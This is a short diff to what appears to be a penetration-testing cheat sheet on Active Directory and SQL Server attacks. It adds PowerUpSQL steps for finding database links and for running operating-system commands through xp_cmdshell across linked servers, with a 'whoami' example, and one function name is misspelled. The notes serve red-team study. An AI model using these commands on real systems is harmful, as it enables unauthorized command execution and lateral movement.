@@ -152,4 +152,7 @@ Invoke-Userhunter -CheckAccess : To confirm admin access
 - Checking Accessibility of server
 -      Get-SQLConnectionTestThread
 - Searching Database Links
--      Get-SQLServerLink -Instance <
+-      Get-SQLServerLink -Instance <an instance mssql service> -verbose
+- Executing Commands on SQL Server (XP_cmdshell should be enabled on the server)
+-      Get-SQLServrLinkCrawler -instance abc-mssql  -Query  "exec master..xp_cmdshell 'whoami'"
+  
